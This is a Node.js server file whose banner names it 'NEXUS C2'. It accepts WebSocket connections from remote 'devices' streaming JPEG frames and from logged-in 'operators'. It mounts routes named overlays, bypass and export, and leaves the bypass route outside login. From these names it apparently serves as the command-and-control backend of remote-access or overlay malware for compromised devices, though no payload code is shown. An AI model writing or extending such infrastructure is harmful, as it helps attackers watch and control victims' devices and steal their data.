'use strict';
require('dotenv').config();

// ── Hard-fail on insecure defaults ────────────────────────────────────────────
if (process.env.NODE_ENV === 'production') {
  const weak = ['ly-v2-dev-secret-replace-me', '', undefined];
  if (weak.includes(process.env.SESSION_SECRET))
    throw new Error('[FATAL] SESSION_SECRET is not set or is the default value. Set it in .env');
  if (!process.env.ADMIN_PASS || process.env.ADMIN_PASS === 'changeme')
    throw new Error('[FATAL] ADMIN_PASS is not set or is "changeme". Set it in .env');
  if (!process.env.DEVICE_SECRET)
    throw new Error('[FATAL] DEVICE_SECRET is not set. Devices need this token to authenticate.');
}

const DEVICE_SECRET = process.env.DEVICE_SECRET || 'dev-device-secret-replace-me';

const http        = require('http');
const path        = require('path');
const fs          = require('fs');
const express     = require('express');
const session     = require('express-session');
const PgSession   = require('connect-pg-simple')(session);
const { pool }    = require('../core/db');
const WebSocket   = require('ws');
const compression = require('compression');
const helmet      = require('helmet');
const rateLimit   = require('express-rate-limit');

const { handleDevice, handleOperator } = require('../core/hub');
const { requireLogin, requireLoginWs } = require('../middleware/auth');
const apiRouter     = require('../routes/api');
const authRouter    = require('../routes/auth');
const overlayRouter = require('../routes/overlays');
const exportRouter  = require('../routes/export');
const bypassRouter  = require('../routes/bypass');

const PORT   = parseInt(process.env.PORT || '3000', 10);
const DB_DIR = path.resolve(
  process.env.DB_PATH ? path.dirname(process.env.DB_PATH) : path.join(__dirname, '../data')
);
fs.mkdirSync(DB_DIR, { recursive: true });

// ── Express ────────────────────────────────────────────────────────────────────
const app    = express();
const server = http.createServer(app);

// Security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc:  ["'self'"],
      scriptSrc:   ["'self'", "'unsafe-inline'"],
      styleSrc:    ["'self'", "'unsafe-inline'"],
      imgSrc:      ["'self'", 'data:', 'blob:'],
      connectSrc:  ["'self'", 'wss:', 'ws:'],
      fontSrc:     ["'self'"],
      objectSrc:   ["'none'"],
      frameSrc:    ["'none'"],
    },
  },
  crossOriginEmbedderPolicy: false,
}));

// Rate limiters
const loginLimiter = rateLimit({
  windowMs:    15 * 60 * 1000,  // 15 minutes
  max:         10,               // 10 attempts per window per IP
  standardHeaders: true,
  legacyHeaders:   false,
  message: { error: 'Too many login attempts. Try again in 15 minutes.' },
});

const apiLimiter = rateLimit({
  windowMs: 60 * 1000,
  max:      300,
  standardHeaders: true,
  legacyHeaders:   false,
});

const sessionMw = session({
  store: new PgSession({
    pool,
    tableName: 'user_sessions',
    createTableIfMissing: true,
    pruneSessionInterval: 60 * 15,
  }),
  secret:            process.env.SESSION_SECRET || 'ly-v2-dev-secret-replace-me',
  resave:            false,
  saveUninitialized: false,
  name:              'ly.sid',
  cookie: {
    secure:   process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: 'strict',
    maxAge:   12 * 60 * 60 * 1000,
  }
});

app.set('trust proxy', 1);
app.use(compression({ threshold: 512 }));
app.use(express.json({ limit: '64mb' }));
app.use(express.urlencoded({ extended: true, limit: '64mb' }));
app.use(sessionMw);

// ── Static files ───────────────────────────────────────────────────────────────
app.use('/static', express.static(path.join(__dirname, '../public'), {
  maxAge: process.env.NODE_ENV === 'production' ? '1h' : 0,
  etag:   true,
}));

// ── Routes ─────────────────────────────────────────────────────────────────────
app.use('/', loginLimiter, authRouter);
app.use('/api',          requireLogin, apiLimiter, apiRouter);
app.use('/api/overlays', requireLogin, overlayRouter);
app.use('/api/bypass',   bypassRouter);
app.use('/api/export',   requireLogin, exportRouter);

app.get('/', requireLogin, (_, res) =>
  res.sendFile('index.html', { root: path.join(__dirname, '../public') })
);

// /health requires login — prevents unauthenticated recon
app.get('/health', requireLogin, (_, res) => res.json({ ok: true, ts: Date.now() }));
app.use((_, res) => res.redirect('/'));

// ── WebSocket ──────────────────────────────────────────────────────────────────
const wss = new WebSocket.Server({
  noServer:          true,
  perMessageDeflate: false,   // JPEG already compressed
  maxPayload:        16_777_216, // 16 MB
  clientTracking:    false,
});

server.on('upgrade', (req, socket, head) => {
  const url = req.url.split('?')[0];

  if (url === '/ws/operator') {
    sessionMw(req, {}, () => {
      if (!requireLoginWs(req)) {
        socket.write('HTTP/1.1 401 Unauthorized\r\nConnection: close\r\n\r\n');
        socket.destroy();
        return;
      }
      wss.handleUpgrade(req, socket, head, ws => handleOperator(ws, req));
    });
    return;
  }

  // Device connection — requires x-device-secret header matching DEVICE_SECRET
  if (url === '/ws/device' || url === '/' || req.headers['x-device-id']) {
    const incomingSecret = req.headers['x-device-secret'];
    if (incomingSecret !== DEVICE_SECRET) {
      socket.write('HTTP/1.1 403 Forbidden\r\nConnection: close\r\n\r\n');
      socket.destroy();
      return;
    }
    wss.handleUpgrade(req, socket, head, ws => handleDevice(ws, req));
    return;
  }

  socket.destroy();
});

// ── Boot ───────────────────────────────────────────────────────────────────────
server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n  NEXUS C2  →  http://0.0.0.0:${PORT}`);
  console.log(`  Device WS →  ws://0.0.0.0:${PORT}/ws/device`);
  console.log(`  Op WS     →  ws://0.0.0.0:${PORT}/ws/operator\n`);
});

process.on('uncaughtException',  e => console.error('[!] uncaught:', e.message));
process.on('unhandledRejection', e => console.error('[!] rejection:', e));
    
